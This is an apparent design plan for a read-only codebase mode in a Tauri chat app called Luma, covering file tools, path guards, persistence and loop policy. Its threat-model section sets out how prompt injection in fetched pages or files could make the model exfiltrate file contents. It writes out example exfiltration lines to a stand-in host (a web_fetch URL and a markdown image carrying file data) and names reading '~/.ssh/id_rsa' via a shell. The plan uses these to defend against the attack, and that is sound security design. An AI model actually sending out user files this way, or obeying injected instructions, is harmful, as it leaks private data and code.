# Luma — Codebase Mode Plan

A working plan (not a permanent doc), grounded in the current codebase.
Delete or archive this file once the work is done.

Guiding principles (from `CLAUDE.md`): surgical changes, simplicity first,
verifiable goals.

---

## What this is

Two modes in one app, the way Chat vs Agent works in Zed/VS Code:

- **chat** (default) — today's behaviour, unchanged.
- **codebase** — a project root is attached; read-only file tools are exposed.

The only new user-facing idea is that you can point Luma at a codebase, ask
questions, and open side chats to drill into the answers — exactly the
existing side-chat pattern, now with a project attached.

---

## The ROADMAP reversal (resolved)

This is a deliberate scope reversal, recorded in the docs rather than silently
overridden.

- `ROADMAP.md` L15-16 states Luma is **"not a coding agent"**.
- `ROADMAP.md` L84-85 lists "Filesystem MCP server" and "Shell execution (too
  dangerous, not research)" as deliberate cuts.

Resolution:

> **Codebase is read-only.** No writes, no shell, no code execution, no task
> completion. That keeps "not a coding agent" literally true, and makes the
> capability research ("understand this codebase") rather than agentic work.

Note the cut was specifically a *Filesystem MCP server* with broad access,
rationalised as "user can drag files in if needed". Root-bounded read tools in
the existing Tauri tool layer are a different, narrower thing.

Precedent for revisiting exists — `ROADMAP.md` already records a reversal
"in case we change our minds" rather than deleting the original cut.

**Status: resolved, on this branch.** `ROADMAP.md` is amended (thesis L17-18,
the filesystem cut L84-85, reversal note L96-104). Nothing left to re-litigate.
Remaining docs land with the code: `README.md` (Features, Architecture, Stack),
`CLAUDE.md` (mode concept, file tools, project root, migration).

---

## Already in place — reuse, don't rebuild

- Side-chat tree, nesting, `parentSideChatId`, path labels,
  `buildSideChatTree` — shipped.
- Tool loop, parallel tool calls, budgets (`toolCallLimit`, `maxSearches`,
  `TOOL_CONCURRENCY`), `ToolActivity` live indicators — shipped.
- `@tauri-apps/plugin-dialog` — already a dependency (backup/restore uses it),
  so the folder picker needs no new package.
- The "filter the tool list before handing it to the model" pattern already
  exists in `useStreamingChat` for the web-search toggle. Codebase reuses it.

---

## Prerequisite: `num_ctx`

`temperature: 0.7` and `num_ctx: 8192` are hardcoded in
`src/lib/ollamaStream.js` `buildRequestBody`. 8192 is too small to read real
source files, so codebase will read truncated code unless this is raised first.

Expose both in Settings: `temperature` 0.0–2.0 (default 0.7), `num_ctx`
2048–131072 (default 8192 — codebase users will want 32768+). One setting is
five edits in `settingsStore.js` (`SETTING_KEYS`, `DEFAULTS`, the store's
initial field, `hydrate()`'s parsed `next` object, a setter) plus a control in
`SettingsPage.jsx`. Read via passed options rather than at module init, and
plumb through `buildRequestBody` (`ollamaStream.js`), where both are currently
hardcoded literals in the request body.

---

## Design

**Mode is a capability switch, not a separate UI surface.** Same panes, same
side-chat tree, same streaming. Codebase adds a project selector and file-tool
activity — nothing else.

Mode is **derived**: `project_roots IS NOT NULL` means codebase mode, so
**attaching a folder is the only switch**. Consequences, all of them
simplifications:

- **No `mode` column, no per-pane mode toggle, no default-mode setting.** An
  earlier draft had a derived mode *and* a per-pane toggle, which is
  incoherent — it implied a "codebase with no project" state that the
  derivation makes impossible. Detaching the folder returns the pane to chat.
- Mode is therefore **per-session, not per-pane**: side chats inherit it and
  get no switch of their own. They already resolve parent context for the
  transcript, and read the roots the same way.
- Stored/display strings, if ever needed, are `"chat"` and `"codebase"`.

**Where the roots live before the session exists.** A pane can attach a folder
before its first message, but the session row is only created on send
(`useStreamingChat` → `createSession`). So the roots sit in the pane's store
(the way `model` already does), and the row is written when it's created — one
`setProjectRoots` call there, plus on attach/detach for an existing session.

**Project roots:** `sessions.project_roots` (nullable TEXT holding a JSON array)
via an appended `MIGRATIONS` step in `db.rs`. The first entry is the **primary**
root; the rest are additional. Set with `open({ directory: true, multiple: true })`
from the dialog plugin.

Passed to the Rust tools as `roots` from renderer session state — **never from
the model.**

### Multiple roots

**Landed.** The header picker is a multi-select, attaching *appends* to the set,
each folder has its own chip with its own detach, and `read_file` / `list_dir`
take the `root` alias described below. What follows is the design that work was
built to, kept for the reasoning.

Modelled as primary + additional, matching ACP's stable `cwd` +
`additionalDirectories` (and VS Code multi-root workspaces). That shape is
settled, and it maps 1:1 if Luma is ever exposed over ACP.

- **Relative paths resolve against one root at a time.** Additional roots are
  addressable but must be named — a flat relative namespace where `src/index.ts`
  could match either root is ambiguous and the model will pick unpredictably.
  The name is the folder's alias, which is also what labels a multi-root search
  hit; an unknown alias is refused with the real ones listed, never guessed at.
- **`root` is on `search_code` after all.** The plan kept it off ("six
  parameters already, a seventh costs reliability"), but the agent log showed
  the model sending it unprompted — its siblings take it — with Tauri dropping
  the unknown argument so the search silently ran against the primary. Four
  rounds went on one `Not found`. Declaring it also made scoping a search into
  a secondary folder possible, which `path` alone never could.
- **A refusal says where the file actually is.** `Not found` for a path that
  exists under another attached root names that root, so the correction is one
  round rather than a hunt for a path-format mistake.
- `search_code` spans all roots unless `root` names one; `read_file` /
  `list_dir` are per-root, defaulting to the primary.
- Extra roots cost nothing now: the storage shape already holds a list, so the
  add-folder affordance arrives with no migration.

**Guard implications (the part that changes):**

- The check becomes **set membership** — reject unless the canonical path is
  under *any* root — and the **roots get canonicalized at call time too**, not
  just the target. A root reached through a symlink otherwise fails
  `starts_with` against its own children.
- Use Rust's `Path::starts_with`, which compares **whole path components**. A
  naive string prefix on `to_string_lossy()` looks equivalent but wrongly admits
  `/home/user/project-evil` when the root is `/home/user/project`. The
  component-wise primitive is safe; the string version is the trap.
- **Reject roots nested inside other roots** — double-covered files and
  duplicated search hits.

### Scoping: default broad, narrow per call

**No conversation-level scoping.** Do not scope a side chat to a subpath. A
question asked while looking at `src/lib/fs.rs` frequently resolves elsewhere —
the trait it implements in a parent module, the caller in a sibling directory,
a code path in a sibling root. Narrowing the whole conversation would make the
model miss exactly the thing it needs.

Every harness agrees: Claude Code has no per-conversation path scoping (narrowing
is a per-call `path` argument the model chooses); Gemini CLI searches *all*
workspace directories when no `dir_path` is given; Codex uses a cwd plus relative
paths. Default broad, narrow per call.

So the narrowing mechanism is the tools' optional `path` argument — not a stored
per-chat scope, and not a column.

**The root set is the boundary, and nothing escapes it.** Dropping conversation
*scoping* is not dropping the *guard*: tools refuse anything outside the attached
roots, always. The model cannot widen its own access — the only way a directory
becomes readable is the user attaching it explicitly as a root, and there is no
tool that does this. Following `..` would turn "read the parent module" into
"read `~/.ssh`", and with `web_fetch` in the same context that is an
exfiltration path.

**The path is storage; the label is display.** Never surface the absolute path
as a title or project name — it's unreadable, machine-specific, and leaks the
username into screenshots (the README ships screenshots). Show the folder's
**basename** (`luma-chat`). Disambiguate with the parent directory only when two
attached projects share a basename (`work/api` vs `personal/api`); the full path
lives in a tooltip/settings and nowhere else. No label column — derive it at
render. Rename support arrives with a future `projects` table.

Session titles stay **independent** — attaching a project does not rename the
session.

*Cheaper alternative:* one global `codebaseProjectRoot` setting, no migration.
Rejected: Luma's unit is a session/research topic, and "add a project" implies
per-session.

---

## Persistence — one column, no new tables

`sessions.project_roots` (nullable TEXT holding a JSON array) is the entire DB
delta: an appended `MIGRATIONS` step wrapped in `.ok()`. Never edit or reorder
existing steps. Add the column to the assertions in
`test_migrations_apply_once_and_track_version`.

A JSON array rather than a normalized roots table: roots are never queried *by
path*, order is meaningful (primary first), and this codebase already JSON-encodes
arrays into columns (`images`, `tool_calls` in message rows). A table only pays for
itself for the deferred `projects`/recents feature.

**Do not split into a separate DB.** `sessions → messages` and
`sessions → side_chats → side_chat_messages` are `ON DELETE CASCADE` foreign
keys, and FKs don't span database files — `delete_session` would stop cascading
and orphan rows. Two connections also mean no single transaction for
`sync_messages`, and a second export/import path for `.lumabackup` (plus a
container version bump).

Separate tables aren't warranted either: a codebase session has the same shape
as any session plus one attribute. `NULL` means a chat session.

The backup **format** needs no change, but the field does *not* ride along by
itself: every session query names its columns explicitly (`load_sessions`'s
`SELECT`, `save_session`'s `INSERT`, `import_all`'s `INSERT`), so all three SQL
sites plus the `Session` struct must learn `project_roots`. `export_all` builds
`Vec<Session>` from `load_sessions`, so export only carries it once the `SELECT`
does.

`import_all` upserts `ON CONFLICT(id) DO UPDATE SET title, model, created_at,
updated_at` — add `project_roots = COALESCE(sessions.project_roots,
excluded.project_roots)`. A session already attached locally (real, existing
paths) keeps its own; a session with no root adopts the backup's, which is the
cross-machine case below.

**Restore across machines:** paths won't exist elsewhere. Keep them and mark the
missing ones **per root** — the remaining roots stay usable. Never fail the
import, and don't fail a whole project because one sibling repo is absent.

Where "missing" is displayed: the **root chip in `ChatPane`'s header**, which
calls the same `validate_project_root` command the attach flow uses (below) on
session load and renders a muted missing state when it fails. The tool layer
independently returns an explicit error at call time, so a stale root can never
be a silent no-op. One command does double duty — attach-time gate and
load-time badge — rather than two existence checks that can disagree.

**Tool results are stored in message rows.** File contents the model reads land
in `messages.tool_calls` JSON, so the byte caps chosen for `fs.rs` bound `luma.db`
growth too, not just context — codebase mode reads far more, far more often than
`web_fetch` ever did.

**Not yet:** a rebuildable code index (symbols/embeddings) would justify its own
table — bulk, derivable, disposable, keyed by `(project, path, mtime)` — but in
the same DB, and indexing is out of scope.

**Upgrade path:** a `projects` table (+ a roots table) and `sessions.project_id`,
backfilled by exploding the existing JSON arrays, if a recents list or multiple
sessions per codebase is ever wanted. Append-only migration, so starting with one
column isn't a dead end.

---

## Tools — read-only, frugal (`tauri/src/tools/fs.rs`)

| Tool | Signature |
|---|---|
| `read_file` | `read_file(path, root?, offset?, limit?)` |
| `search_code` | `search_code(query, root?, path?, glob?, output?, regex?, no_ignore?)` |
| `list_dir` | `list_dir(path?, root?)` |

There is deliberately **no `root` parameter on the other search-related
knobs**: `root` picks the folder and `path` picks the subdirectory inside it.
`path` is always **relative** to the root in play. `output` is `content` (default) | `files` | `count`. `regex` is opt-in;
literal matching is the default. Use the `ignore` + `grep` crates (ripgrep's
libraries) — don't hand-roll a walker, don't shell out to `rg`.

**Search output modes.** `content` returns `path:line: match`; `files` returns
paths only; `count` returns a per-file tally (e.g. `47 matches in 12 files`, top
files listed). `files` and `count` are the triage modes for broad scans — and
they capture a terminal's aggregation win without a shell.

`content` stays the default because it answers a focused question in one call,
and **a round-trip isn't free** — every tool call re-sends the whole pane
transcript, so forcing a locate-then-read pair can cost more than one slightly
larger result. That is only safe because of the caps below.

**Result caps:** per-file (~20 matches) plus total (~100). The per-file cap is
the important one — without it one generated file with thousands of matches
eats the whole budget. It is also why Claude Code defaults to `files`; with the
cap, `content` is safe to default to.

**`read_file` output is line-numbered** — `{n}→{content}`, real file line
numbers even when `offset > 1` (the `cat -n` shape the established harnesses
converged on). The model needs the numbers to cite a location and to choose the
next `offset`, and it matches `search_code`'s `path:line:` results instead of
inventing a second convention.

**Not in v1:** `write_file`, `edit_file`, `run_command`, diffs, indexing, LSP.
Those are exactly what would make it a coding agent.

---

## Tool contracts

Settled defaults. These are baked into the signatures above, so they get
expensive once `fs.rs` exists.

1. **Literal search by default.** `search_code` treats `query` as a literal
   string; `regex: true` opts into ripgrep syntax. Rationale: Luma's models are
   the weakest of the established harnesses' targets — `user.name` means literal,
   but a regex engine matches `userXname`. When `regex` is set, compile the
   pattern first and return a clean error rather than a crash (Gemini does
   `new RegExp(pattern)`).
2. **`offset`/`limit`, 1-based.** Matches Claude Code's names, which more models
   have seen. Gemini's own code (`start_line`/`end_line`) and its docs
   (`offset`/`limit`) disagree — that divergence is the trap to avoid. Say
   "1-based" explicitly in the tool description.
3. **Cap before load.** Every cap is applied *before* materializing a file —
   never `read_to_string` and then truncate. Claude Code shipped a fix for
   exactly this: it used to load the whole requested range into memory before
   rejecting it, so one minified line could exhaust memory. Includes a
   **per-line cap (2000 chars)**, not just line/byte caps.
4. **Ignore policy: search yes, read no.** `search_code` respects `.gitignore`
   (the `ignore` crate default), with `no_ignore` to override. `read_file` and
   `list_dir` do **not** refuse ignored files — Gemini does, and it breaks
   legitimate reads (`.env.example`, generated files, `dist/`). Invariant:
   anything search can find, read can open.
5. **Timeout per tool, enforced *inside* the loop.** A timeout that only stops
   the caller's `await` leaves the walk running — a blocking walk can't be
   killed from outside, whether it sits in `spawn_blocking` or on a bare
   thread. So the walker checks a wall-clock deadline between entries and
   returns *partial* results plus a "timed out — narrow `path`" notice (roughly
   Gemini's wording). A cancel flag, if one is ever wired, is checked the same
   way: cooperative, never external termination. A user can attach the wrong
   root and hang the app otherwise. Keep the commands `async fn` + the walk in
   `spawn_blocking`, per the `web_search` command shape, so no walk occupies the
   command thread.

   Wiring Stop into it is **deferred**: it needs the chat's `request_id`
   plumbed through `executeTool` into the fs commands so they share the
   `CancelRegistry` entry — real plumbing for a rare path. The deadline is the
   v1 floor, and it's the part that actually bounds damage.

### Result and error contracts

- **Never silently return less than asked.** A truncated read returns the
  partial window *plus* an explicit notice naming the total line count and the
  `offset` to continue from. (Claude Code errors instead when an explicit range
  doesn't fit; partial-plus-notice avoids burning a round, which matters more
  for weaker models.) The invariant is that the model is always told.
- **`read_file` on a directory** → clear error, never a panic.
- **Empty file** → distinct from "not found".
- **`offset` past EOF** → notice including the file's line count.
- **Search results** are `path:line: match`, sorted by path then line —
  deterministic, so model behaviour and tests don't drift.
- **Expected path errors are observations, not `Error`-prefixed results.** A wrong path
  guess (`not found`, `outside the project root`, `is a directory`, `binary`,
  `offset past EOF`) is normal during codebase exploration, so it comes back as
  a plain tool result the model reads and reacts to — *not* an error string.
  This matters well beyond cosmetics: `runToolCalls` computes `allFailed` with
  `!result.startsWith("Error")` — **the bare word, no colon** — and `streamChat`
  jumps straight to the wrap-up round when it's true (`ollama.js` L327-329).
  Left alone, one guessed path ends the session.
  So the rule for every observation string is stricter than the plan first
  stated: it must not **begin with the word `Error` at all**, colon or not.
  `Not found: src/foo.rs`, `Directory, not a file: src/`, `Binary file: …` — not
  `Error: not found`. Only infrastructure failures (IO error, timeout, quota)
  keep the prefix, and `Error: QUOTA:` specifically still has to match, since
  `streamChat` keys off that exact string to end the stream.
- **Multi-root results** carry the root alias, so matches are not ambiguous.
- **Tool errors never print an absolute path** — roots are named by basename
  alias, so a tool result can't leak `$HOME` into a transcript that may get
  screenshotted or shared.

### Pitfalls to handle in the implementation

- **Windows:** `fs::canonicalize` returns `\\?\C:\...` (extended-length prefix).
  Comparing that against an unprefixed root breaks the guard and prints badly.
  Normalize it, or use `dunce`.
- **Non-UTF-8:** `read_to_string` *fails* on UTF-16 and Latin-1 files, which are
  real (Windows tooling generates them). Detect binary via NUL scan — but note
  UTF-16 trips a naive NUL check — and return an explicit "binary/undecodable"
  message, as Gemini does.
- **Line endings:** split on `\r?\n`, or every line carries a stray `\r`.
- **Case:** smart-case — case-insensitive unless the query contains an uppercase
  character (ripgrep's convention). Gemini is fully case-insensitive; smart-case
  suits code identifiers better.
- **Symlink cycles:** don't enable `follow_links` when walking. The `ignore`
  crate doesn't follow by default, and a symlinked tree or a loop would
  otherwise blow up.
- **`list_dir` ordering:** directories first, then alphabetical (Gemini's shape).
- **Symlinks that point outside the root are rejected — and that will surprise
  monorepo users.** pnpm/yarn workspaces and Bazel layouts symlink packages in
  from elsewhere, so a legitimate-looking path resolves outside the root and
  gets refused. The message has to say *which* — "symlink resolves outside the
  project root" — not a bare "outside the project root", or the user can't tell
  it apart from a traversal attempt. The obvious remedy (attach the link target
  as a second root) doesn't exist until the add-folder UI, so the wording
  matters more in v1 than it would later.

---

## Loop policy — how Codebase mode differs

The existing wrap-up policy was tuned for "answer one question with a few
searches", and it actively fights repository exploration. Four changes, all in
`ollama.js` / `ollamaStream.js` / `useStreamingChat.js`:

1. **The wrap-up nudge moves with the mode.** `maxToolRounds` (the soft
   "write your final answer" nudge, currently 10) becomes ~20 in codebase mode.
   Reading a repo legitimately needs more than ten rounds; that number was
   tuned for single questions, not "understand this module".
   **No new hard cap.** `toolCallLimit` keeps doing its existing job as the
   user's setting (default 0 = unlimited) — a separate codebase hard cap (~40)
   would duplicate `maxFileCalls` below, two knobs guarding the same hole. The
   budgets are what bound the spend; the nudge is what prompts a conclusion.
2. **`allFailed` stops tripping on a wrong guess** — fixed at the convention
   level (expected path errors are observations; see above), not by a
   codebase-only branch in the orchestrator. One rule for both modes, with the
   budgets and the round nudge as the backstops.
3. **File tools get their own budget**, mirroring `maxSearches`: two
   accumulators on the same `limits` object, feeding the same
   `budgetExhausted` → force-final path.
   - `maxFileCalls` — default 40.
   - `maxFileBytes` — default ~150_000 (≈40k tokens, roughly one context's
     worth of source). **Decided: yes.** Per-call caps bound one call; nothing
     bounds thirty of them, and every round re-sends the whole transcript, so a
     big read compounds rather than adds. It also bounds `luma.db` growth from
     `messages.tool_calls`.

   Both are counted like `searchCount` — after each round, so either can
   overshoot by at most one batch. Defaults live as `streamChat` params (as
   `maxSearches` already does), passed from `useStreamingChat`; no new Settings
   UI in v1.
4. **Suppress the web-search nudge.** `WEB_SEARCH_NUDGE_AT = 15`
   (`ollama.js` L101) fires on round number alone — `systemMessagesForRound`
   only checks `round === webSearchNudgeAt`, never which tools ran. In codebase
   mode, round 15 therefore injects "DuckDuckGo rate-limits… stop searching now
   and write your final answer" into the middle of an exploration that may have
   made zero searches, and it lands *before* the round-20 wrap-up nudge, so the
   two disagree. Pass `webSearchNudgeAt: null` (a null never equals a round
   number) while a root is attached. The alternative — make the nudge conditional
   on web calls actually having happened — is arguably the better rule in *both*
   modes, but it changes existing chat behaviour, so it stays a follow-up rather
   than being smuggled into this feature.

**System prompt.** `systemPrompt.js` needs a codebase variant — **both**
templates, `buildMainChatTemplate` and `buildSideChatTemplate`, since side chats
inherit codebase mode. Both currently say "never mention tool failures… not even
once" (right for web search, actively harmful for a wrong path the model must
visibly correct) and cap the response at 8 tool calls. Codebase replaces exactly
those clauses: paths are relative to the project root, read before you assert,
keep exploring after a path misses, and here is the budget. Everything else
(citations, depth over speed) stays.

---

## Path safety — the part not to be lazy about

Model supplies a **relative** path only. Rust joins to `root`,
**canonicalizes both the root and the target**, *then* checks the prefix —
canonicalize before the check or symlinks walk straight out, and a symlinked
root otherwise fails the check against its own children. Reject absolute paths
and `..` as a first line, with the canonical component-wise prefix check as the
real guard.

**Attaching a root is the security boundary, so it's validated at attach time.**
`validate_project_root` is a Tauri command the frontend calls before it stores
anything, and it refuses:

- a path that doesn't exist, or isn't a directory;
- `/`;
- `$HOME`;
- Luma's own app data dir, or any ancestor of it — which would hand the model
  `luma.db` and every API key in it.

Without this, one click on `/` is a whole-machine boundary and the guard above
is theatre. The command returns the **canonical** path, so what gets stored is
already normalized.

Cap all outputs (bytes/lines) so a large file never crosses IPC into the
prompt — same spirit as `MAX_HTML_BYTES`.

## Threat model

Root bounding stops *escape*. It does not stop the four things below, and two of
them are egress paths the previous draft missed.

**1. Content inside allowed files is untrusted.** `web_fetch` puts arbitrary web
text into the same context, so a fetched page can instruct the model to read
another project file.

**2. File tools + web tools = an egress channel.** Read-only bounds
*destruction*, not *disclosure*. Nothing stops an injected model from reading a
file and then sending it out through `web_search(query)` or
`web_fetch("https://evil.com/?d=…")`. Note the web-search **default is already
off** (`DEFAULTS.webSearchDefault = false`) — the exposure is a user who turned
it on, carrying that into a session that now also has file access.

**3. Rendered markdown is an egress channel with no tool call and no click.**
`MarkdownBody.jsx` has no `img` override and no `urlTransform`, and
`tauri.conf.json` sets `"csp": null`. A reply containing
`![](https://evil.com/?d=<file contents>)` is fetched by the WebView the moment
the message renders. Turning web tools off does not touch this path, and it's the
cheapest exfil in the app. Worse, **the URL is persisted** — it's ordinary
message content in `messages.content`, so anything that only renders it inert
*while* codebase mode is active re-opens the channel on detach, on reload, or
whenever the session is opened in chat mode. Any fix scoped to the live mode is
not a fix.

**4. The default setup uploads the codebase.** Ollama cloud means every
`read_file` result leaves the machine for a remote server. Threats 1-3 are all
about *inbound* injection; this is the outbound half.

Mitigations, cheapest first:

- **Close the markdown image channel with a CSP — this is the primary fix.**
  `app.security.csp` in `tauri.conf.json` becomes `"img-src 'self' data:
  blob:"`. One line, and it closes the channel *everywhere*: every message,
  every mode, including a transcript restored from SQLite or a pane that has no
  idea what mode it's in. Persistence is exactly why the CSP has to be the fix
  rather than a mode-scoped render change.
  Verified cost before shipping it: the app's only two `<img>` tags
  (`MessageBubble`, `InputArea`) use `data:` URLs and `assetProtocol` isn't
  enabled, so nothing the UI itself renders breaks. The loss is remote images in
  ordinary chat markdown — a deliberate trade. Tauri layers its own
  `script-src`/`connect-src` handling around a custom CSP, so specifying only
  `img-src` leaves the other directives unrestricted, but it *is* a WebView-wide
  change: confirm the app still boots, streams, and attaches images in dev and in
  a bundle before calling it done.
- **Optional extra: the `img` override in `MarkdownBody`.** Rendering images
  inert in codebase mode (alt text plus a link the user can open) is defense in
  depth if remote images are ever re-enabled. Not required once the CSP lands,
  and it costs a `codebase` prop threaded through `MessageBubble` into
  `MarkdownBody`'s `useMemo` — so it's deferred rather than built speculatively.
  If it *is* built later, key it on "session has ever had roots", not "has roots
  now", for the persistence reason above.
- **Default web tools off in Codebase mode.** They are the egress and the
  per-pane toggle already exists, so this reuses the existing
  derive-default-then-user-override pattern (`*TouchedRef`), re-derived when the
  root set changes. **Recommended over removing the capability** — the default
  state is safe, and a user who wants docs lookup during codebase work can still
  turn it back on. For the ironclad version, disabling the toggle while a project
  is attached is a one-line change; that's the single open question left.
- **Treat file contents as untrusted input**, exactly like a fetched page. Never
  let the harness act on instructions found in a file.
- **Secrets inside the root** (`.env`, `*.pem`, `id_*`): root bounding does not
  help. Still an open call — a denylist costs false negatives (`.env.example`)
  for a threat the two fixes above mostly close. Leaning *no denylist* if web
  tools default off in codebase mode; revisit otherwise.
- **Threat 4 is a notice, not a gate.** In scope for v1 as a **one-time notice
  when a root is attached while `ollamaUrl` isn't local** (not
  `localhost`/`127.0.0.1`/`::1`; empty = the local default), acknowledged through
  a settings KV entry so it doesn't nag. The user already picked a cloud model,
  so blocking would be paternalistic. No per-root prompts, no redaction.

---

## Wiring

| File | Change |
|---|---|
| `tauri/Cargo.toml` | **five new dependencies** — `ignore` (gitignore-aware walk), `grep-searcher` + `grep-regex` (ripgrep's search engine, so no hand-rolled matching), `regex` (compile-validate the `regex:` pattern, `regex::escape` for the literal default; can't be used undeclared even though it's transitively present), `dunce` (Windows `\\?\` canonicalization — hand-rolling that is the thing not to hand-roll). Match ripgrep's minor versions so the tree doesn't gain duplicate `regex` copies. `grep-matcher` arrives with `grep-regex`; no `walkdir`, no `fancy-regex`. |
| `tauri/tauri.conf.json` | `app.security.csp`: `null` → `"img-src 'self' data: blob:"` (the markdown-image egress fix — independent of this feature, worth doing first) |
| `tauri/src/tools/fs.rs` | new module — the three tools + root-bounding resolver (roots as a `&[PathBuf]` param, no Tauri context, so it's unit-testable) |
| `tauri/src/tools/mod.rs` | `mod fs;` + `pub use` |
| `tauri/src/commands.rs` | three thin `#[tauri::command]` wrappers plus `validate_project_root` and `set_project_roots`. `web_search` is a plain `async fn` and the repo has no `spawn_blocking` yet — the walk must go in `tokio::task::spawn_blocking` (tokio is already `features = ["full"]`), so this is **new for this work**, not an existing pattern being followed |
| `tauri/src/lib.rs` | register all five in `generate_handler![]` |
| `tauri/src/db.rs` | append migration; `project_roots` on the `Session` struct + all three explicit column lists (`load_sessions`, `save_session`, `import_all` with the `COALESCE` merge); `set_project_roots` |
| `src/lib/db.js` | `setProjectRoots` / `validateProjectRoot` wrappers |
| `src/lib/tools.js` | schemas in `TOOLS`; `executeTool` cases invoking Tauri (mirror `web_search`) |
| `src/lib/systemPrompt.js` | codebase variant for **both** templates (`buildMainChatTemplate` + `buildSideChatTemplate`) — relative paths, read before asserting, keep going after a miss, budget |
| `src/lib/ollama.js` | codebase `limits`: `maxToolRounds` 20, `webSearchNudgeAt: null`, the two file budgets |
| `src/lib/ollamaStream.js` | `num_ctx` / `temperature` through `buildRequestBody`; the two file budgets in `limits` |
| `src/hooks/useStreamingChat.js` | withhold file tools unless a root is set; pass the codebase loop params; web tools re-derived off on attach; pass the roots to `executeTool` |
| `src/components/ChatPane.jsx` | attach/detach folder in the header + root chip with the missing state — **no mode toggle** |
| `src/components/MessageBubble.jsx` + `MarkdownBody.jsx` | **optional** — inert images in codebase mode, only if the CSP is ever reverted |
| `src/store/chatStore.js` | per-pane `projectRoots`, hydrated on session load, persisted on create |
| `src/store/sessionStore.js` | pass roots through create/attach/detach |
| `src/store/settingsStore.js` | `numCtx` + `temperature`; remote-notice ack |

---

## Acceptance

1. `cargo test` (fs.rs) — a `../` path, an absolute path, and a symlink pointing
   outside the root are rejected; a **symlinked root** still resolves its own
   children; a path under no root in the set is rejected; `/root-evil` does not
   pass a `/root` check (component-wise `Path::starts_with`); the symlink
   rejection names the symlink as the reason, not just "outside the root".
2. `cargo test` (fs.rs) — `validate_project_root` refuses `/`, `$HOME`, a file,
   and the app data dir; a root nested inside another is dropped from the set.
3. Chat mode: the tool list sent to the model contains no file tools (assert in
   `ollamaStream.test.js`); attaching a root adds them.
4. Codebase: `read_file` respects `offset`/`limit`, numbers lines, flags
   truncation with the next `offset`, and reports directory / binary / past-EOF
   distinctly; `list_dir` / `search_code` return bounded results; search is
   literal unless `regex` is set; **no observation string starts with the word
   `Error`** (assert it directly — this is the invariant `allFailed` depends on,
   and it's a bare `startsWith("Error")` with no colon to catch it later).
5. Loop policy (`ollama.streamloop.test.js`): a round of `not found` results does
   **not** jump to the wrap-up round; `maxFileBytes` / `maxFileCalls`
   exhaustion forces the tools-disabled final answer; and round 15 of a codebase
   run injects **no** web-search nudge.
6. Backup round-trip carries `project_roots`, and importing a backup whose paths
   don't exist keeps the roots and marks them missing rather than failing.
7. Manual: drill into a repo, open a side chat from an answer, confirm the side
   chat is codebase without its own toggle and the main thread is undisturbed.
8. Manual: a message containing `![](https://evil.example/x)` renders no remote
   image — in **any** mode, and again after reloading a session whose folder was
   already detached (i.e. the CSP holds without any mode knowledge). Confirm the
   app boots, streams, and still shows attached images with the CSP in place.

---

## Out of scope (deliberate cuts — don't relitigate)

Shell execution, code execution sandbox, write/edit tools, multi-agent
orchestration, MCP servers, database tools, voice I/O, image generation beyond
vision input, LSP.

**No terminal.** A shell is the one thing that breaks the root-set boundary by
definition (`cat ~/.ssh/id_rsa`, `curl`), and with `web_fetch` putting untrusted
text in the same context it turns prompt injection into exfiltration. Its real
token win is aggregation, which `search_code`'s `files`/`count` modes capture
instead. If history questions ever prove essential, revisit a narrow **read-only
git tool** (`log`/`blame`/`show`, fixed argv, output cap, timeout) — not a
general shell.

**Read-only filesystem tools are no longer deferred** — in scope as Codebase
mode, because reading a codebase to understand it is research. The test for
any future proposal still holds: *does this help a user research and deeply
understand a topic?* If no, it doesn't ship.

---

## Build order

0. The CSP (`tauri.conf.json`) — one line, independent of this feature, and it
   closes the cheapest exfil path in the app. Do it first so it isn't gated
   behind the rest.
1. Settings prerequisite — `num_ctx` / `temperature` (`settingsStore.js` →
   `SettingsPage.jsx` → `buildRequestBody`). Nothing else is testable against a
   real repo until the context window can hold a source file.
2. `tauri/Cargo.toml` deps, then `tauri/src/tools/fs.rs` — resolver + the three
   tools + `validate_project_root`, with the `cargo test` guard cases. Pure
   functions over `&[PathBuf]`, no Tauri context.
3. `db.rs` — migration, `Session` field, three column lists, `set_project_roots`.
4. Commands (incl. the first `spawn_blocking` in the repo) + `lib.rs`
   registration + `db.js` wrappers + `tools.js` schemas and `executeTool` cases.
5. Loop policy — budgets, nudge suppression, the observation-vs-error
   convention, and the codebase system prompt (both templates), with the loop
   tests.
6. UI — attach/detach + root chip, per-pane roots in the store.

---

## Open questions

One, and it's a default rather than a blocker:

- **Web tools in Codebase mode:** default off on attach with the user free to
  re-enable (recommended above), or hard-disabled while a project is attached?
  The recommendation is the first — safe by default, no capability removed, and
  it reuses the existing toggle pattern. Both are small; the second is one line
  in the same filter, so this is reversible either way.

Everything else in this document is decided — including the former
`maxFileBytes` question, now `maxFileBytes` + `maxFileCalls` under Loop policy.
